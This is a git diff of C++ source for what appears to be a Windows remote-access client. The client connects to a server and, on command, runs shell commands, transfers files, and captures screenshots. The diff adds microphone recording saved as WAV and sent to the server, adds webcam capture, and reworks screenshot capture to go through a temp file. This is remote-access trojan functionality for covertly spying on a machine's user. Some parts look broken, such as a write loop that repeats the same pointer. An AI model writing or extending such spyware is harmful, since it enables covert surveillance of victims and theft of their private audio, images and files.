@@ -63,6 +63,7 @@ int main(int argc, char* argv[]) {
 					}
 
 					if (command.compare("Mic") == 0) {
+						Micro(atoi(option.c_str()), connectSocket);
 					}
 
 					if (command.compare("Screenshot") == 0) {
@@ -70,6 +71,7 @@ int main(int argc, char* argv[]) {
 					}
 
 					if (command.compare("Camera") == 0) {
+						Camera(connectSocket);
 					}
 
 					if (command.compare("Remote") == 0) {
@@ -86,11 +88,11 @@ int main(int argc, char* argv[]) {
 				free(input);
 			}
 		}
-		ServerDisconnected: {}
+	ServerDisconnected: {}
 	}
 
 
-	ClientShutdown:
+ClientShutdown:
 	// shutdown the connection since no more data will be sent
 	iResult = shutdown(connectSocket, SD_SEND);
 	if (iResult == SOCKET_ERROR) {
@@ -109,7 +111,7 @@ int main(int argc, char* argv[]) {
 // wait for server socket and connect
 void waitAndConnect(SOCKET* connectSocket) {
 	int iResult = 0;
-	addrinfo* result = NULL, * ptr = NULL;
+	addrinfo* result = NULL, *ptr = NULL;
 	addrinfo hints;
 
 	ZeroMemory(&hints, sizeof(hints));
@@ -209,7 +211,7 @@ void sendFile(const char* fileName, SOCKET connectSocket) {
 
 // receive file from server and save
 void receiveFile(const char* fileName, SOCKET connectSocket) {
-	char* buffer = NULL, * filePath = NULL;
+	char* buffer = NULL, *filePath = NULL;
 	HANDLE file = NULL;
 	int iResult = 0;
 	DWORD dwByteWritten = 0;
@@ -370,7 +372,7 @@ void doCommandAndSend(const char* command, SOCKET connectSocket) {
 		}
 	} while (ok == TRUE);
 
-	cleanup:
+cleanup:
 	CloseHandle(pi.hProcess);
 	CloseHandle(pi.hThread);
 	CloseHandle(hStdInPipeWrite);
@@ -450,47 +452,36 @@ void Screenshot(SOCKET connectSocket) {
 			iResult = GetDIBits(hScreenDC, hBitmap, 0, (UINT)bitmap.bmHeight, bmpData, (BITMAPINFO*)&bmpInfoHeader, DIB_RGB_COLORS);
 			ok = iResult != 0 && iResult != ERROR_INVALID_PARAMETER;
 
-			//send ok signal
-			sendSignal(ok, connectSocket);
+			char* tempFileName = (char*)calloc(MAX_PATH, sizeof(char));
+			if (tempFileName) {
 
-
-			if (ok) {
-				//send file size
-				iResult = send(connectSocket, (char*)&bmpFileHeader.bfSize, sizeof(bmpFileHeader.bfSize), 0);
-				if (iResult <= 0) {
-					printf("[ERROR] send. %d\n", WSAGetLastError());
-					return;
-				}
-
-				//send file header
-				iResult = send(connectSocket, (char*)&bmpFileHeader, sizeof(BITMAPFILEHEADER), 0);
-				if (iResult < 0) {
-					printf("[ERROR] send. %d\n", WSAGetLastError());
-					return;
-				}
-
-
-				//send info header
-				iResult = send(connectSocket, (char*)&bmpInfoHeader, sizeof(BITMAPINFOHEADER), 0);
-				if (iResult < 0) {
-					printf("[ERROR] send. %d\n", WSAGetLastError());
-					return;
-				}
-
-				//send bitmap data
-				int remaining = dwBmpSize;
-				char* ptr = bmpData;
-				while (remaining > 0) {
-					iResult = send(connectSocket, ptr, BUFSIZ, 0);
-					if (iResult > 0) {
-						ptr += iResult;
-						remaining -= iResult;
+				GetTempFileName(".", "tmp", 0, tempFileName);
+				HANDLE file = CreateFile(tempFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+				if (file != NULL && file != INVALID_HANDLE_VALUE) {
+					DWORD byteWritten = 0;
+					if (!WriteFile(file, &bmpFileHeader, sizeof(BITMAPFILEHEADER), &byteWritten, NULL)) {
+						printf("ERROR %d\n", GetLastError());
 					}
-					else {
-						printf("[ERROR] send. %d\n", WSAGetLastError());
-						return;
+					if (!WriteFile(file, &bmpInfoHeader, sizeof(BITMAPINFOHEADER), &byteWritten, NULL)) {
+						printf("ERROR %d\n", GetLastError());
 					}
+
+
+					while (byteWritten > 0) {
+						if (!WriteFile(file, &bmpData, BUFSIZ, &byteWritten, NULL)) {
+							printf("ERROR %d\n", GetLastError());
+
+						}
+					}
+
+					CloseHandle(file);
+
+					sendFile(tempFileName, connectSocket);
+
+					//DeleteFile(tempFileName);
 				}
+
+				free(tempFileName);
 			}
 
 			free(bmpData);
@@ -509,10 +500,138 @@ void Screenshot(SOCKET connectSocket) {
 }
 
 // Start recording and send file to server
-void Micro(int milliseconds, SOCKET connectSocket);
+void Micro(int seconds, SOCKET connectSocket) {
+	MMRESULT result = MMSYSERR_ERROR;
+	HWAVEIN hWaveIn = NULL;
+	WAVEFORMATEX waveFormat = {};
+
+	waveFormat.wFormatTag = WAVE_FORMAT_PCM;
+	waveFormat.nChannels = 1;
+	waveFormat.nSamplesPerSec = 44100; // 44.1 kHz
+	waveFormat.wBitsPerSample = 8;
+	waveFormat.nBlockAlign = waveFormat.nChannels * (waveFormat.wBitsPerSample / 8);
+	waveFormat.nAvgBytesPerSec = waveFormat.nSamplesPerSec * waveFormat.nBlockAlign;
+
+	waveFormat.cbSize = 0;
+
+	result = waveInOpen(&hWaveIn, WAVE_MAPPER, &waveFormat, 0, 0, WAVE_FORMAT_DIRECT);
+
+	if (result == MMSYSERR_NOERROR) {
+		DWORD bufferLength = seconds * waveFormat.nSamplesPerSec;
+		char* data = (char*)calloc(bufferLength, sizeof(char));
+
+		if (data) {
+
+			WAVEHDR waveHdr = {};
+			waveHdr.lpData = (LPSTR)data;
+			waveHdr.dwBufferLength = bufferLength;
+
+			result = waveInPrepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
+			if (result != MMSYSERR_NOERROR) {
+				printf("[ERROR] waveInPrepareHeader.\n");
+			}
+			result = waveInAddBuffer(hWaveIn, &waveHdr, sizeof(WAVEHDR));
+
+			if (result != MMSYSERR_NOERROR) {
+				printf("[ERROR] waveInAddBuffer.\n");
+			}
+
+			result = waveInStart(hWaveIn);
+
+			if (result != MMSYSERR_NOERROR) {
+				printf("[ERROR] waveInStart.\n");
+			}
+
+			printf("Recording.\n");
+
+			Sleep(seconds * 1000);
+			waveInClose(hWaveIn);
+			printf("Done.\n");
+
+			const char chunkId[] = "RIFF";
+			uint32_t fileSize = bufferLength + 22;
+			const char format[] = "WAVE";
+			const char subchunk1Id[] = "fmt ";
+			uint32_t subchunk1Size = 16;
+			uint16_t audioFormat = waveFormat.wFormatTag;
+			uint16_t numChannels = waveFormat.nChannels;
+			uint32_t sampleRate = waveFormat.nSamplesPerSec;
+			uint32_t byteRate = waveFormat.nAvgBytesPerSec;
+			uint16_t blockAlign = waveFormat.nBlockAlign;
+			uint16_t bitsPerSample = waveFormat.wBitsPerSample;
+			const char subchunk2Id[] = "data";
+			uint32_t subchunk2Size = bufferLength * sizeof(char);
+
+			DWORD byteWritten = 0;
+
+			char* tempFileName = (char*)calloc(MAX_PATH, sizeof(char));
+			GetTempFileName(".", "tmp", 0, tempFileName);
+
+			HANDLE file = CreateFile(tempFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+			if (file != NULL && file != INVALID_HANDLE_VALUE) {
+				WriteFile(file, chunkId, 4, &byteWritten, NULL);
+				WriteFile(file, &fileSize, sizeof(fileSize), &byteWritten, NULL);
+				WriteFile(file, format, 4, &byteWritten, NULL);
+				WriteFile(file, subchunk1Id, 4, &byteWritten, NULL);
+				WriteFile(file, &subchunk1Size, sizeof(subchunk1Size), &byteWritten, NULL);
+				WriteFile(file, &audioFormat, sizeof(audioFormat), &byteWritten, NULL);
+				WriteFile(file, &numChannels, sizeof(numChannels), &byteWritten, NULL);
+				WriteFile(file, &sampleRate, sizeof(sampleRate), &byteWritten, NULL);
+				WriteFile(file, &byteRate, sizeof(byteRate), &byteWritten, NULL);
+				WriteFile(file, &blockAlign, sizeof(blockAlign), &byteWritten, NULL);
+				WriteFile(file, &bitsPerSample, sizeof(bitsPerSample), &byteWritten, NULL);
+				WriteFile(file, subchunk2Id, 4, &byteWritten, NULL);
+				WriteFile(file, &subchunk2Size, sizeof(subchunk2Size), &byteWritten, NULL);
+				WriteFile(file, data, bufferLength * sizeof(char), &byteWritten, NULL);
+
+				CloseHandle(file);
+
+				sendFile(tempFileName, connectSocket);
+
+				DeleteFile(tempFileName);
+			}
+
+			free(tempFileName);
+			free(data);
+		}
+	}
+
+}
 
 // Take camera picture and send file to server
-void Camera(SOCKET connectSocket);
+void Camera(SOCKET connectSocket) {
+	HWND hWebcam = NULL;
+
+	BOOL ok = TRUE;
+	char* driverName = NULL, *driverDesc = NULL;
+
+	hWebcam = capCreateCaptureWindow("Webcam", WS_CHILD | WS_VISIBLE, 0, 0, 1920, 1080, GetDesktopWindow(), 0);
+	ok &= hWebcam != NULL;
+
+	for (int i = 0; i < 10; i++) {
+		driverName = (char*)calloc(BUFSIZ, sizeof(char));
+		driverDesc = (char*)calloc(BUFSIZ, sizeof(char));
+		if (driverName && driverDesc) {
+
+			if (capGetDriverDescription(i, driverName, BUFSIZ, driverDesc, BUFSIZ)) {
+				printf("%d - %s - %s\n", i, driverName, driverDesc);
+
+				capDriverConnect(hWebcam, i);
+				capFileSaveDIB(hWebcam, "temp.bmp");
+				capDriverConnect(hWebcam, i);
+
+				free(driverName);
+				free(driverDesc);
+				break;
+			}
+
+			free(driverName);
+			free(driverDesc);
+		}
+	}
+
+	if (hWebcam) DestroyWindow(hWebcam);
+}
 
 void sendSignal(BOOL signal, SOCKET connectSocket) {
 	if (send(connectSocket, (char*)&signal, sizeof(signal), 0) < 0) {
